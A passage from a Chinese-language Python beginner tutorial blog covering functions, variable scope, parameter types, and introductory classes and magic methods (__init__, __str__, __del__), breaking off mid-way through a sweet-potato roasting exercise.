有参数，有返回值的函数</h3><pre><code class="python">&quot;&quot;&quot;有参数，有返回值的函数函数定义：def 函数名字(形参1，形参2，……):    函数体    return 返回结果函数调用：返回变量 = 函数名字(实参1，实参2，……)&quot;&quot;&quot;# 函数定义def func_sum(n):    &quot;&quot;&quot;    功能：实现1~n累加和    :param n: n 控制累加的范围    :return: 累加后的最终结果    &quot;&quot;&quot;    # 1. 设置条件变量    i = 1    _sum = 0    # 2. while 条件(i &lt;= n):    while i &lt;= n:        # 3. 累加        _sum += i        # 4. 条件变量改变        i += 1    # 5. 循环外面，返回累加的最终结果    return _sum# 函数调用ret = func_sum(100)print(ret)</code></pre><h2 id="六、函数的嵌套调用"><a href="#六、函数的嵌套调用" class="headerlink" title="六、函数的嵌套调用"></a>六、函数的嵌套调用</h2><h3 id="1-函数的嵌套调用"><a href="#1-函数的嵌套调用" class="headerlink" title="1. 函数的嵌套调用"></a>1. 函数的嵌套调用</h3><ul><li>一个函数里面 <strong>又调用</strong> 了 <strong>另外一个函数</strong>，这就是 <strong>函数嵌套调用</strong></li></ul><pre><code class="python"># 定义fun01函数def fun01():    print(&#39;开始调用fun01&#39;)    print(&#39;结束调用fun01&#39;)# 定义fun02函数，在代码块中间调用fun01def fun02():    print(&#39;开始调用fun02&#39;)    # 调用fun01    fun01()    print(&#39;结束调用fun02&#39;)# 函数调用fun02()</code></pre><ul><li>如果函数 <code>func02</code> 中，调用了另外一个函数 <code>func01</code><ul><li>那么执行到调用 <code>func01</code> 函数时，会先把函数 <code>func01</code> 中的任务都执行完</li><li>才会回到 <code>func02</code> 中调用函数 <code>func01</code> 的位置，继续执行后续的代码</li></ul></li></ul><h3 id="2-函数嵌套的应用"><a href="#2-函数嵌套的应用" class="headerlink" title="2. 函数嵌套的应用"></a>2. 函数嵌套的应用</h3><h4 id="2-1-打印多行分隔线"><a href="#2-1-打印多行分隔线" class="headerlink" title="2.1 打印多行分隔线"></a>2.1 打印多行分隔线</h4><p>需求：</p><ol><li><p>设计一个函数，打印一行分隔线：可指定数量，可指定分隔线字符的样式 如： 一行分隔线字符的数量为5，字符样式为<code>&#39;^_^ &#39;</code></p><pre><code class="shell"> ^_^ ^_^ ^_^ ^_^ ^_^</code></pre></li><li><p>设计一个函数，打印n行分隔线，可指定一行分隔线字符的数量，可指定分隔线字符的样式 如：3行分隔线，一行分隔线字符的数量为5，字符样式为<code>&#39;^_^ &#39;</code></p><pre><code class="shell"> ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^ ^_^</code></pre></li></ol><p>示例代码：</p><pre><code class="python">def print_char(num, char):    &quot;&quot;&quot;    功能：打印指定数量字符的分隔线    :param num: 字符的数量    :param char: 字符样式    :return: None    &quot;&quot;&quot;    print(num * char)def print_lines(n, num, char):    &quot;&quot;&quot;    功能：打印n行分隔线    :param n: 打印的行数    :param num: 一行分隔线字符的数量    :param char: 分隔线的字符样式    :return: None    &quot;&quot;&quot;    # 1. 设置条件变量 i = 0    i = 0    # 2. while 条件：    while i &lt; n:        # 3. 打印一行的分隔线        print_char(num, char)        # 4. 条件变量的改变        i += 1# 函数调用print_lines(3, &#39;^_^ &#39;, 5)</code></pre><h4 id="2-2-求三个数的平均值"><a href="#2-2-求三个数的平均值" class="headerlink" title="2.2 求三个数的平均值"></a>2.2 求三个数的平均值</h4><p>需求：</p><ol><li>设计一个函数求三个数的和</li><li>设计一个函数求三个数的平均值</li></ol><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;1. 设计一个函数求三个数的和2. 设计一个函数求三个数的平均值&quot;&quot;&quot;def sum_3_number(a, b, c):    &quot;&quot;&quot;求3个数的和&quot;&quot;&quot;    return a + b + cdef avg_3_number(a, b, c):    &quot;&quot;&quot;求3个数的平均值&quot;&quot;&quot;    # 先对3数求和，返回值为求和后的结果    sum_result = sum_3_number(a, b, c)    # 接着，再求平均值    avg_result = sum_result / 3    # 最终平均值结果作为函数返回值    return avg_result# 调用函数，完成对3个数求平均值result = avg_3_number(11, 2, 55)print(&quot;average is %.2f&quot; % result)</code></pre><h2 id="七、局部变量和全局变量"><a href="#七、局部变量和全局变量" class="headerlink" title="七、局部变量和全局变量"></a>七、局部变量和全局变量</h2><h3 id="1-局部变量"><a href="#1-局部变量" class="headerlink" title="1. 局部变量"></a>1. 局部变量</h3><ul><li><strong>局部变量</strong>：函数定义的形参，函数内部定义的变量</li><li>不同的函数，可以定义相同的名字的局部变量，但是各用个的不会产生影响</li><li>局部变量的作用域只在函数内部</li><li>局部变量的目的是 <strong>存储需要临时保存的数据</strong></li></ul><pre><code class="python"># 函数定义def func(temp):    a = 10    print(a)# 函数调用func(22)# NameError: name &#39;a&#39; is not defined# print(&#39;函数的外部：&#39;, a)    # err# print(&#39;函数的外部: &#39;, temp)    # err</code></pre><h3 id="2-全局变量"><a href="#2-全局变量" class="headerlink" title="2. 全局变量"></a>2. 全局变量</h3><h4 id="2-1-全局变量"><a href="#2-1-全局变量" class="headerlink" title="2.1 全局变量"></a>2.1 全局变量</h4><ul><li>在函数外部定义的变量叫做 <strong>全局变量</strong></li><li>全局变量能够在所有的函数中进行访问(不修改)</li></ul><pre><code class="python"># 定义全局变量num = 10def func():    print(&#39;func num = &#39;, num)func()  # 函数调用print(&#39;函数的外面 num = &#39;, num)</code></pre><p>运行结果：</p><pre><code class="python">func num =  10函数的外面 num =  10</code></pre><h4 id="2-2-函数内修改全局变量"><a href="#2-2-函数内修改全局变量" class="headerlink" title="2.2 函数内修改全局变量"></a>2.2 函数内修改全局变量</h4><h5 id="2-2-1-默认不能直接修改全局变量"><a href="#2-2-1-默认不能直接修改全局变量" class="headerlink" title="2.2.1 默认不能直接修改全局变量"></a>2.2.1 默认不能直接修改全局变量</h5><pre><code class="python"># 定义全局变量num = 10def func():    # 函数内给一个变量赋值时，重新生成一个局部变量num    # 函数内的num和外面的num没有关系    num = 250    print(&#39;func num = &#39;, num)  # 获取是函数内的numfunc()  # 函数调用# 函数外获取的是全局变量的值print(&#39;函数的外面 num = &#39;, num)</code></pre><ul><li><strong>函数内赋值变量</strong> 时，<strong>默认为定义并赋值局部变量</strong></li><li><strong>函数内</strong>获取的是<strong>函数内局部变量</strong>的值，<strong>函数外</strong>获取的是全局变量的值</li></ul><p>运行结果：</p><pre><code class="shell">func num =  250函数的外面 num =  10</code></pre><h5 id="2-2-2-通过global声明修改全局变量"><a href="#2-2-2-通过global声明修改全局变量" class="headerlink" title="2.2.2 通过global声明修改全局变量"></a>2.2.2 通过global声明修改全局变量</h5><ul><li>如果在函数中修改全局变量，那么就需要先使用<code>global</code>进行声明，再进行修改</li></ul><pre><code class="python"># 定义全局变量num = 10def func():    # global num 告诉解释器，函数内部使用的num就是外面的全局变量num    global num    num = 250   # 修改全局变量    print(&#39;func num = &#39;, num)func()  # 函数调用print(&#39;函数的外面 num = &#39;, num)</code></pre><p>运行结果：</p><pre><code class="shell">func num =  250函数的外面 num =  250</code></pre><h2 id="八、函数的参数2：参数详解"><a href="#八、函数的参数2：参数详解" class="headerlink" title="八、函数的参数2：参数详解"></a>八、函数的参数2：参数详解</h2><h3 id="1-位置参数"><a href="#1-位置参数" class="headerlink" title="1. 位置参数"></a>1. 位置参数</h3><ul><li>函数调用时，按形参的位置，从左往右，一一匹配传递参数</li><li>位置参数必须一一对应，缺一不可</li></ul><pre><code class="python"># 函数定义def func(num1, num2):    print(&#39;num1 = &#39;, num1)    print(&#39;num2 = &#39;, num2)# 函数调用func(1, 2)</code></pre><h3 id="2-关键字参数"><a href="#2-关键字参数" class="headerlink" title="2. 关键字参数"></a>2. 关键字参数</h3><ul><li>函数调用时，通过 <strong><code>形参=值</code></strong> 方式为函数形参传值，不用按照位置为函数形参传值，这种方式叫关键字参数</li><li>注意：<ul><li>关键字参数必须在位置参数的右边</li><li>对同一个形参不能重复传值</li></ul></li></ul><pre><code class="python"># 函数定义def func(num1, num2):    print(&#39;num1 = &#39;, num1)    print(&#39;num2 = &#39;, num2)# 函数调用func(num2=1, num1=2)</code></pre><h3 id="3-缺省参数"><a href="#3-缺省参数" class="headerlink" title="3. 缺省参数"></a>3. 缺省参数</h3><ul><li><strong>形参设定默认值</strong>，称为缺省参数，也叫默认参数</li><li>注意：<ul><li>调用函数时，如果没有传入默认参数对应的实参，则使用默认值</li><li>默认参数必须在普通参数的后边</li></ul></li></ul><pre><code class="python"># 默认参数必须在普通参数的后边def func(a, b=20, c=10):    print(a, b, c)# 函数调用func(1)  # a=1,b=20,c=10func(1, 2)  # a=1,b=2,c=10func(1, 3, 2)  # a=1,b=3,c=2</code></pre><h3 id="4-不定长参数"><a href="#4-不定长参数" class="headerlink" title="4. 不定长参数"></a>4. 不定长参数</h3><h4 id="4-1-元组型不定长参数"><a href="#4-1-元组型不定长参数" class="headerlink" title="4.1 元组型不定长参数"></a>4.1 元组型不定长参数</h4><ul><li><p>函数可以定义 <strong>不定长参数</strong>，<strong>用于接收任意数量的位置实参</strong></p></li><li><p>形参变量名前面加上一个<code>*</code></p><p>，这个参数则为元</p><p>组型不定长参数</p><ul><li>形参变量名一般叫： <code>args</code></li></ul></li><li><p>函数体使用不定长参数，直接使用变量名即可，无需加<strong><code>\*</code></strong></p></li><li><p>不定长参数的本质是 <strong>将传递的参数包装成了元组</strong></p></li></ul><pre><code class="python"># *args 为不定长参数，可以接收0~多个实参# 把实参的1,2,3, 包装成元组(1, 2, 3)再传递, 等价于args = (1, 2, 3)def func(*args):    # 函数内部使用，无需加*    print(args, type(args))# 函数调用func(1, 2, 3)   # (1, 2, 3) &lt;class &#39;tuple&#39;&gt;</code></pre><h4 id="4-2-字典型不定长参数"><a href="#4-2-字典型不定长参数" class="headerlink" title="4.2 字典型不定长参数"></a>4.2 字典型不定长参数</h4><ul><li><p>不定长参数还有一种形式 <strong>可以接收任意数量的关键字实参</strong></p></li><li><p>定义参数时需要在形参名前添加</p><pre><code>**</code></pre><p>，则为字典型不定长参数，在函数体使用不定长参数，直接使用变量名即可，无需加</p><p><code>*</code></p><ul><li>形参变量名一般叫： <code>kwargs</code></li></ul></li><li><p>这种不定长参数会将 <strong>关键字参数包装成字典</strong></p></li></ul><pre><code class="python"># 把实参包装成 {&#39;city&#39;: &#39;sz&#39;, &#39;age&#39;: 18}给kwargs传递# kwargs = {&#39;city&#39;: &#39;sz&#39;, &#39;age&#39;: 18}def func(name, **kwargs):    # 存在形参name, name不会被包装到字典中    print(name)    print(kwargs)  # 函数内部使用，无需加*# 实参的写法： 变量=数据，变量=数据func(name=&#39;mike&#39;, city=&#39;sz&#39;, age=18)</code></pre><p><strong>注意:</strong></p><ul><li><strong>已经存在的形参</strong>, 其对应的关键字实参 <strong>不会被包装到字典中</strong></li><li><strong>字典型可变形参必须在形参列表的最后边</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础07-面向对象1：类和对象、魔方方法</title>
      <link href="/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8007-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A11%EF%BC%9A%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%E3%80%81%E9%AD%94%E6%96%B9%E6%96%B9%E6%B3%95/"/>
      <url>/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8007-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A11%EF%BC%9A%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1%E3%80%81%E9%AD%94%E6%96%B9%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象1：类和对象、魔方方法"><a href="#面向对象1：类和对象、魔方方法" class="headerlink" title="面向对象1：类和对象、魔方方法"></a>面向对象1：类和对象、魔方方法</h1><h2 id="一、面向对象编程"><a href="#一、面向对象编程" class="headerlink" title="一、面向对象编程"></a>一、面向对象编程</h2><a id="more"></a><h3 id="1-面向过程"><a href="#1-面向过程" class="headerlink" title="1. 面向过程"></a>1. 面向过程</h3><ul><li>把编程任务划分成一个一个的步骤，然后按照步骤分别去执行。<ul><li>以 <strong>小明起床上学</strong> 为例，面向过程则做了如下 4 件事：起床、穿衣、洗漱、上学，这 4 个过程的顺序很重要，须一个一个地实现。</li></ul></li><li>对于<strong>面向过程</strong>的思想： 需要实现一个功能的时候，看重的是开发的步骤和过程，每一个步骤都需要自己亲力亲为。<ul><li>以 吃饭 举例：买菜、洗菜、煮饭、切菜……</li></ul></li><li>面向过程编程适合开发<strong>中小型项目</strong></li></ul><h3 id="2-面向对象"><a href="#2-面向对象" class="headerlink" title="2. 面向对象"></a>2. 面向对象</h3><ul><li><p>把构成问题事务分解成各个</p><p>对象</p><p>，建立对象的目的不是为了完成一个步骤，而是为了描述某个事物在整个解决问题步骤中的行为。</p><ul><li>以 <strong>小明起床上学</strong> 为例，我们关心的是<strong>小明</strong>这个<strong>对象</strong>，而不是 起床、穿衣、洗漱、上学 这 4 个过程，这 4 个过程是<strong>小明</strong>这个对象的一部分，只是其中的一种行为，而且对于行为的顺序没有强制要求。</li></ul></li><li><p>对于<strong>面向对象</strong>的思想：当需要实现一个功能的时候，看重的并不是过程和步骤，而是关心的是对象，对象能做啥</p><ul><li>以 吃饭 举例：找 饭馆 对象，饭馆提供菜和饭，不关心做菜和煮饭的内部过程</li></ul></li><li><p>面向对象编程适合<strong>开发大型项目</strong></p></li></ul><h2 id="二、类和对象"><a href="#二、类和对象" class="headerlink" title="二、类和对象"></a>二、类和对象</h2><h3 id="1-类"><a href="#1-类" class="headerlink" title="1. 类"></a>1. 类</h3><ul><li>很多事物存在 <strong>相同的属性和行为(也叫方法)</strong>，比如人有姓名年龄，能吃饭睡觉等等。</li><li>描述 <strong>具有共同特征的事物的 抽象</strong>，称为 <strong>类</strong> (class)。</li><li>类包含两个组成部分：<ul><li><strong>属性</strong>：比如姓名，年龄，身高，肤色等</li><li><strong>方法</strong>：比如吃饭，睡觉，飞行，歌唱等</li></ul></li></ul><h3 id="2-对象"><a href="#2-对象" class="headerlink" title="2. 对象"></a>2. 对象</h3><ul><li><strong>对象</strong> 是 <strong>类</strong> 的实例，是具体的实体</li></ul><h3 id="3-类和对象的关系"><a href="#3-类和对象的关系" class="headerlink" title="3. 类和对象的关系"></a>3. 类和对象的关系</h3><ul><li>类是对象的模板(不占内存空间)，对象是类的实例(占内存空间)。<ul><li>类相当于图纸，对象相当于根据图纸制造的实物。</li></ul></li><li>每个对象必须有一个对应的类。</li></ul><h2 id="三、定义类"><a href="#三、定义类" class="headerlink" title="三、定义类"></a>三、定义类</h2><h3 id="1-定义类"><a href="#1-定义类" class="headerlink" title="1. 定义类"></a>1. 定义类</h3><p>定义一个类，格式如下：</p><pre><code class="python">#class 类名:#class 类名(): # 前2个旧式写法(经典类)，不推荐class 类名(object):    方法列表（不是真的是列表，只是多个函数的定义）</code></pre><p><strong>说明：</strong></p><ul><li>定义类时有 2 种形式：经典类和新式类，前两行注释部分则为经典类，推荐写新式类</li><li>object 是Python 里所有类的最顶级父类</li><li>类名 的命名规则按照 <strong>驼峰命名法</strong></li></ul><h3 id="2-定义方法"><a href="#2-定义方法" class="headerlink" title="2. 定义方法"></a>2. 定义方法</h3><p>定义方法(方法也叫实例方法)格式为：</p><pre><code class="python">class 类名(object):    def 方法名(self):         ...</code></pre><ul><li>方法的格式和函数类似，也可以设置参数和返回值，但是 <strong>需要设置第一个参数为</strong> <code>self</code></li><li>编辑器一般会自动生成<code>self</code> ，后面会讲解 <code>self</code> 的作用</li></ul><p>示例代码：</p><pre><code class="python">class Dog(object):    # self自动添加的，后面有讲解    # 定义在类里面的函数，叫方法    def eat(self):        print(&#39;吃骨头&#39;)    def drink(self):        print(&#39;喝水&#39;)</code></pre><h2 id="四、创建对象和调用方法"><a href="#四、创建对象和调用方法" class="headerlink" title="四、创建对象和调用方法"></a>四、创建对象和调用方法</h2><h3 id="1-创建对象"><a href="#1-创建对象" class="headerlink" title="1. 创建对象"></a>1. 创建对象</h3><ul><li><p>Python中，可以根据已经定义的类去创建示例对象。</p></li><li><p>创建对象的格式为:</p><pre><code class="python">对象变量名 = 类名()</code></pre></li></ul><p>示例代码：</p><pre><code class="python"># 定义类型class Dog(object):    # 定义在类里面的函数，叫方法    def eat(self):        print(&#39;吃骨头&#39;)    def drink(self):        print(&#39;喝水&#39;)# 创建对象格式：实例对象变量名 = 类名()dog1 = Dog()</code></pre><h3 id="2-调用方法"><a href="#2-调用方法" class="headerlink" title="2. 调用方法"></a>2. 调用方法</h3><p>调用方法的格式为:</p><pre><code class="python">对象变量名.方法名()</code></pre><ul><li>注意：虽然定义方法时设置第一个参数 <code>self</code>，但是 <strong>调用方法时不要传递对应<code>self</code>的参数</strong>，解释器自动处理</li></ul><p>示例代码：</p><pre><code class="python">class Dog(object):    # 定义在类里面的函数，叫方法    def eat(self):        print(&#39;吃骨头&#39;)    def drink(self):        print(&#39;喝水&#39;)# 创建对象格式：实例对象变量名 = 类名()dog1 = Dog()# 对象变量.方法名字(), self不用处理dog1.eat()dog1.drink()</code></pre><h3 id="3-创建多个对象"><a href="#3-创建多个对象" class="headerlink" title="3. 创建多个对象"></a>3. 创建多个对象</h3><ul><li>类作为对象的模具，根据类可以创建多个对象</li></ul><pre><code class="python">class Dog(object):    # 定义在类里面的函数，叫方法    def eat(self):        print(&#39;吃骨头&#39;)    def drink(self):        print(&#39;喝水&#39;)# 对象1 = 类名()# 对象2 = 类名()# 对象1dog1 = Dog()dog1.eat()dog1.drink()# 对象2dog2 = Dog()dog2.eat()dog2.drink()</code></pre><h2 id="五、添加和使用属性"><a href="#五、添加和使用属性" class="headerlink" title="五、添加和使用属性"></a>五、添加和使用属性</h2><h3 id="1-添加和使用属性"><a href="#1-添加和使用属性" class="headerlink" title="1. 添加和使用属性"></a>1. 添加和使用属性</h3><ul><li>对象既然有实例方法，也有自己的属性。</li><li>定义/添加属性格式：</li></ul><pre><code class="python">对象变量名.属性名 = 数据</code></pre><ul><li>属性和变量类似，<strong>首次赋值时会定义属性</strong>，再次赋值改变属性</li></ul><p>示例代码：</p><pre><code class="python">class Dog(object):    # 定义在类里面的函数，叫方法    def eat(self):        print(&#39;吃骨头&#39;)    def drink(self):        print(&#39;喝水&#39;)# 1. 创建对象变量dog1 = Dog()# 2. 对象变量.属性 = 数值dog1.age = 3# 打印属性print(dog1.age)# 修改属性dog1.age = 2print(dog1.age)</code></pre><h2 id="六、self的作用"><a href="#六、self的作用" class="headerlink" title="六、self的作用"></a>六、self的作用</h2><h3 id="1-self是什么"><a href="#1-self是什么" class="headerlink" title="1. self是什么"></a>1. self是什么</h3><ul><li><p>在Python类中规定，实现方法的第一个参数是实例对象本身，并且约定俗成，把其名字写为self。</p></li><li><p>某个对象调用其方法时，Python解释器会</p><p>自动把这个对象</p><p>作为第一个参数传递给方法</p><ul><li>通俗理解：哪个对象调用方法，方法中self就是这个对象</li></ul></li></ul><p>示例代码：</p><pre><code class="python"># 定义类class Dog(object):    def print_info(self):        print(&#39;测试self&#39;, id(self))# 创建对象1dog1 = Dog()# 打印dog1的idprint(&quot;调用方法前&quot;, id(dog1))# dog1调用print_info, print_info的self就是dog1# 底层调用：print_info(dog1)， 解释器自动把dog1传给方法中的selfdog1.print_info()print(&quot;调用方法后&quot;, id(dog1))print(&#39;=&#39;*30)# 创建对象2dog2 = Dog()print(&quot;调用方法前&quot;, id(dog2))dog2.print_info()print(&quot;调用方法后&quot;, id(dog2))</code></pre><p>运行结果：</p><pre><code class="python">调用方法前 4400762352测试self 4400762352调用方法后 4400762352==============================调用方法前 4400762544测试self 4400762544调用方法后 4400762544</code></pre><h3 id="2-self的作用"><a href="#2-self的作用" class="headerlink" title="2. self的作用"></a>2. self的作用</h3><ul><li>在方法中使用 <code>self</code>，可以获取到调用当前方法的对象，进而获取到该对象的属性和方法</li><li>self作用：为了<strong>区分</strong>不同对象的属性和方法</li></ul><pre><code class="python"># 定义类class Dog(object):    def print_info(self):        print(self.type)# 创建对象，实例化对象dog1 = Dog()# 添加属性dog1.type = &#39;大黄狗&#39;# 直接调用方法dog1.print_info()print(&#39;=&#39;*30)dog2 = Dog()dog2.type = &#39;旺财&#39;dog2.print_info()</code></pre><h2 id="七、魔法方法：init"><a href="#七、魔法方法：init" class="headerlink" title="七、魔法方法：init()"></a>七、魔法方法：<strong>init</strong>()</h2><h3 id="1-魔法方法"><a href="#1-魔法方法" class="headerlink" title="1. 魔法方法"></a>1. 魔法方法</h3><ul><li>在Python中，所有以 <code>__</code> <strong>双下划线</strong>包起来的方法，都统称为 <strong>Magic Method</strong> ，中文称 <strong>魔法方法</strong></li><li>魔法方法是系统提供好的方法名字，用户需重新实现它</li><li>魔法方法一般情况下无需手动调用，在合适时候自动会调用</li></ul><h3 id="2-init-基本使用"><a href="#2-init-基本使用" class="headerlink" title="2. __init__()基本使用"></a>2. <code>__init__()</code>基本使用</h3><ul><li><code>__init__()</code>方法叫做 <strong>对象的初始化方法</strong>，在 <strong>创建一个对象后会被自动调用</strong>，不需要手动调用</li><li><code>__init__()</code>方法的作用：添加属性</li></ul><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;__init__方法：    1. 作用：添加属性    2. 特点：创建对象的时候，实例化对象，自动调用__init__方法&quot;&quot;&quot;class Dog(object):    def __init__(self):        &quot;&quot;&quot;初始化函数，添加属性&quot;&quot;&quot;        self.type = &#39;大黄狗&#39;        print(&#39;init方法调用了&#39;)    def print_info(self):        &quot;&quot;&quot;打印实例属性&quot;&quot;&quot;        print(self.type)# 1. 创建对象，实例化对象，自动调用__init__方法# 2. 尽管是自动调用方法，也是dog1自动调用方法，所以，self就是dog1dog1 = Dog()# 手动调用实例方法dog1.print_info()</code></pre><p>运行结果：</p><pre><code class="python">init方法调用了大黄狗</code></pre><h3 id="3-init-自定义参数"><a href="#3-init-自定义参数" class="headerlink" title="3. __init__()自定义参数"></a>3. <code>__init__()</code>自定义参数</h3><ul><li><code>__init__(self)</code>除了默认参数<code>self</code>，还可以设置任意个数的自定义参数，例如：<code>__init__(self,x,y,z)</code></li><li>init方法 <strong>设置的自定义参数必须和创建对象时传递的参数保持一致</strong>，例如：<code>对象变量名 = 类名(x,y,z)</code></li><li>开发者可以 <strong>设置自定义参数</strong>，为对象的默认属性提供 <strong>不同的初始值</strong></li></ul><p>示例代码：</p><pre><code class="python">class Dog(object):    def __init__(self, _type):        &quot;&quot;&quot;初始化函数，添加属性&quot;&quot;&quot;        self.type = _type        print(&#39;init方法调用了&#39;)    def print_info(self):        &quot;&quot;&quot;打印实例属性&quot;&quot;&quot;        print(self.type)# 创建对象，实例化对象，自动调用__init__方法# &#39;旺财&#39;传递给 _type 形参dog1 = Dog(&#39;旺财&#39;)# 直接调用方法dog1.print_info()print(&#39;=&#39;*30)dog2 = Dog(&#39;来福&#39;)dog2.print_info()</code></pre><p>运行结果：</p><pre><code class="shell">init方法调用了旺财==============================init方法调用了来福</code></pre><h2 id="八、魔法方法：str"><a href="#八、魔法方法：str" class="headerlink" title="八、魔法方法：str()"></a>八、魔法方法：<strong>str</strong>()</h2><h3 id="1-str-方法的使用"><a href="#1-str-方法的使用" class="headerlink" title="1. str()方法的使用"></a>1. <strong>str</strong>()方法的使用</h3><ul><li>如果直接 print 打印对象，会看到创建出来的对象在内存中的地址</li><li>当使用<code>print(对象变量名)</code>输出对象的时候，只要类中定义了<code>__str__()</code>方法，就会打印<code>__str__()</code>方法返回值</li><li><code>__str__()</code>方法作用主要返回对象属性信息，<code>print(对象变量名)</code>输出对象时直接输出<code>__str__()</code>方法返回的描述信息</li><li><code>__str__()</code>方法的返回值必须是 <strong>字符串类型</strong></li></ul><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;__str__方法:    1. 返回值必须是字符串类型    2. print(对象变量名)  对象变量名的位置替换为__str__()方法返回值的内容&quot;&quot;&quot;class Dog(object):    # 添加属性，type, age    def __init__(self, _type, _age):        self.type = _type        self.age = _age    # 测试有定义 __str__ 方法，和没有定义，print(对象)的区别    def __str__(self):        return f&#39;类型{self.type},年龄{self.age}&#39;        # return &quot;类型：%s， 年龄：%d&quot; % (self.type, self.age)# 创建对象dog1 = Dog(&#39;大白狗&#39;, 3)# 如果有__str__ 方法，dog1的位置替换为__str__()方法返回值的内容print(dog1)print(&#39;对象描述信息为：&#39;, dog1)</code></pre><p>运行结果：</p><pre><code class="shell">类型：大白狗， 年龄：3对象描述信息为： 类型：大白狗， 年龄：3</code></pre><h2 id="九、魔法方法：-del"><a href="#九、魔法方法：-del" class="headerlink" title="九、魔法方法：__del__()"></a>九、魔法方法：<code>__del__()</code></h2><h3 id="1-del-方法的使用"><a href="#1-del-方法的使用" class="headerlink" title="1. del()方法的使用"></a>1. <strong>del</strong>()方法的使用</h3><ul><li>在对象的生命周期结束(对象销毁)时, <code>__del__()</code>方法会自动被调用，做一些清理工作</li></ul><pre><code class="python">class Dog(object):    def __del__(self):        print(&#39;我悄悄地离开了&#39;)# 设计一个函数，在函数内容创建对象# 函数调用完毕，里面创建的对象，生命周期结束，自动调用__del__方法def func():    dog1 = Dog()print(&#39;函数调用前&#39;)# 调用函数func()print(&#39;函数调用后&#39;)</code></pre><p>运行结果：</p><pre><code class="shell">函数调用前我悄悄地离开了函数调用后</code></pre><h2 id="应用：烤地瓜"><a href="#应用：烤地瓜" class="headerlink" title="应用：烤地瓜"></a>应用：烤地瓜</h2><h3 id="1-需求说明"><a href="#1-需求说明" class="headerlink" title="1. 需求说明"></a>1. 需求说明</h3><p>烤地瓜规则：</p><ol><li>地瓜有自己的状态，默认是生的，地瓜可以进行烧烤</li><li>地瓜有自己烧烤的总时间，由每次烧烤的时间累加得出</li><li>地瓜烧烤时，需要提供本次烧烤的时间</li><li>地瓜烧烤时，地瓜状态随着烧烤总时间的变化而改变：[0, 3) 生的、[3, 6) 半生不熟、[6, 8) 熟了、&gt;=8 烤糊了</li><li>输出地瓜信息时，可以显示地瓜的状态和烧烤的总时间</li></ol><h3 id="2-面向对象设计"><a href="#2-面向对象设计" class="headerlink" title="2. 面向对象设计"></a>2. 面向对象设计</h3><h4 id="2-1-地瓜类"><a href="#2-1-地瓜类" class="headerlink" title="2.1 地瓜类"></a>2.1 地瓜类</h4><ol><li>使用 <code>SweetPotato</code> 类可以创建 <strong>地瓜对象</strong></li><li>地瓜有两个属性：<ul><li><strong>状态 state</strong>：字符串</li><li><strong>烧烤总时间 cooked_time</strong>：整数</li></ul></li><li>定义cook方法, 提供参数time设置本次烧烤的时间<ul><li>使用 <strong>本次烧烤时间</strong> 对 <strong>烧烤总时间</strong> 进行 <strong>累加</strong></li><li>根据烧烤总时间, 设置地瓜的状态：<ul><li>[0, 3) -&gt; 生的</li><li>[3, 6) -&gt; 半生不熟</li><li>[6, 8) -&gt; 熟了</li><li>大于等于8 -&gt; 烤糊了</li></ul></li></ul></li></ol><h4 id="2-2-主程序逻辑"><a href="#2-2-主程序逻辑" class="headerlink" title="2.2 主程序逻辑"></a>2.2 主程序逻辑</h4><ol><li>创建 <strong>地瓜对象</strong></li><li><strong>分多次</strong> <strong>烧烤地瓜</strong></li><li>每烧烤一次，<strong>输出地瓜信息</strong></li></ol><h4 id="2-3-示例代码"><a href="#2-3-示例代码" class="headerlink" title="2.3 示例代码"></a>2.3 示例代码</h4><h5 id="2-3-1-步骤流程"><a href="#2-3-1-步骤流程" class="headerlink" title="2.3.1 步骤流程"></a>2.3.1 步骤流程</h5><pre><code class="Python">&quot;&quot;&quot;# SweetPotato 类的设计    地瓜有两个属性：        状态 state：字符串        烧烤总时间 cooked_time：整数# 1. 定义__init__方法，添加2个属性    # 1.1 默认状态state是生的    # 1.2 默认时间cooked_time是0# 2. 定义__str__方法    # 2.1 返回地瓜状态，烧烤总时间# 3. 定义 cook 方法, 提供参数 time 设置 本次烧烤的时间    # 3.1 使用 本次烧烤时间 对 烧烤总时间 进行 累加    # 3.2 根据 烧烤总时间, 设置地瓜的状态：        [0, 3) -&gt; 生的        [3, 6) -&gt; 半生不熟        [6, 8) -&gt; 熟了        大于等于8 -&gt; 烤糊了# 4. 主逻辑程序# 4.1 创建 地瓜对象# 4.2 分多次烧烤地瓜# 4.3 每烧烤一次，输出地瓜信息&quot;&quot;&quot;</code></pre><h5 id="2-3-2-定义地瓜类、通过-init-（）方法添加属性"><a href="#2-3-2-定义地瓜类、通过-init-（）方法添加属性" class="headerlink" title="2.3.2 定义地瓜类、通过__init__（）方法添加属性"></a>2.3.2 定义地瓜类、通过<code>__init__（）方法</code>添加属性</h5><pre><code class="python">class SweetPotato(object):    &quot;&quot;&quot;地瓜类&quot;&quot;&quot;    # 1. 定义__init__方法，添加2个属性    def __init__(self):        # 1.1 默认状态state是生的        self.state = &#39;生的&#39;        # 1.2 默认时间cooked_time是0        self.cooked_time = 0</code></pre><h5 id="2-3-3-定义-str-方法"><a href="#2-3-3-定义-str-方法" class="headerlink" title="2.3.3 定义__str__()方法"></a>2.3.3 定义<code>__str__()</code>方法</h5><pre><code class="python">    # 2. 定义__str__方法    def __str__(self):        # 2.1 返回地瓜状态，烧烤总时间        return f&#39;地瓜状态为：{self.state}, 烧烤总时间为：{self.cooked_time} 分钟&#39;</code></pre><h5 id="2-3-4-定义”烤地瓜”方法"><a href="#2-3-4-定义”烤地瓜”方法" class="headerlink" title="2.3.4 定义”烤地瓜”方法"></a>2.3.4 定义”烤地瓜”方法</h5><pre><code class="python">    # 3. 定义 cook 方法, 提供参数 time 设置 本次烧烤的时间    def cook(self, time):        # 3.1 使用 本次烧烤时间 对 烧烤总时间 进行 累加        